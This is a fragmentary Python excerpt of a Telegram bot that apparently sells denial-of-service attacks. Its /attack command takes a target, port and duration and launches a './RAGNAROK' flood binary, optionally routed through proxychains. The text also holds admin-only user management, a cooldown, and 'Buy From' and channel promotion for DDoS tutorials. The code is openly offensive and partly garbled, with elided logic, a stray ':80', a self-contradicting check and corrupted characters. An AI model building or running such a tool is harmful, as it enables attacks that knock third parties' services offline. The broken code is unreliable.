...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "𝐎𝐧𝐥𝐲 @SHIVAMXRAJ 𝐎𝐟 𝐁𝐨𝐭 𝐂𝐚𝐧 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝"
...
𝐔𝐬𝐚𝐠𝐞: /remove <𝐮𝐬𝐞𝐫𝐢𝐝>'''
        ...
        response = "𝐎𝐧𝐥𝐲 @SHIVAMXRAJ 𝐎𝐟 𝐁𝐨𝐭 𝐂𝐚𝐧 𝐔𝐬𝐞 𝐓𝐡??𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝"
...
def handle_attack(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in user_id:
            ...
            if user_id in attack_cooldown and (datetime.datetime.now() - attack_cooldown[user_id]).seconds < COOLDOWN_TIME:80
            response = "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐨𝐧 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧.\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 80 𝐒𝐞𝐜𝐨𝐧𝐝 𝐛𝐞𝐟𝐨𝐫𝐞 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐭𝐡𝐞 /attack 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐚𝐠𝐚𝐢𝐧"
            bot.reply_to(message, response)
            return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 700:
                ...
                if proxy:
                    full_command = f"proxychains4 -q ./RAGNAROK {target} {port} {time} 950"
                    os.environ['PROXYCHAINS_PROXY'] = proxy
                else:
                    full_command = f"./RAGNAROK {target} {port} {time} 950"
...
🛒 𝐁𝐮𝐲 𝐅𝐫𝐨𝐦 :-\n𝟏.@SHIVAMXRAJ\n
🏫𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 :- https://t.me/+GbQoCdFp6SczNjQ1
'''
...
𝟑. 𝐌𝐚𝐤𝐞 𝐒𝐮𝐫𝐞 𝐘𝐨𝐮 𝐉𝐨𝐢𝐧𝐞𝐝 https://t.me/+GbQoCdFp6SczNjQ1 𝐎𝐭𝐡𝐞𝐫𝐰𝐢𝐬𝐞 𝐓𝐡𝐞 𝐃𝐃𝐨𝐒 𝐖𝐢𝐥𝐥 𝐍𝐨𝐭 𝐖𝐨𝐫𝐤.
...
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝐇𝐞𝐫𝐞'𝐬 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐎𝐟 𝐃𝐞𝐭𝐚𝐢𝐥𝐞𝐝 𝐕𝐞𝐝𝐢𝐨 𝐇𝐨𝐰 𝐓𝐨 𝐃𝐃𝐨𝐒 𝐅𝐫𝐨𝐦 https://t.me/+GbQoCdFp6SczNjQ1 :\nhttps://t.me/+GbQoCdFp6SczNjQ1'''
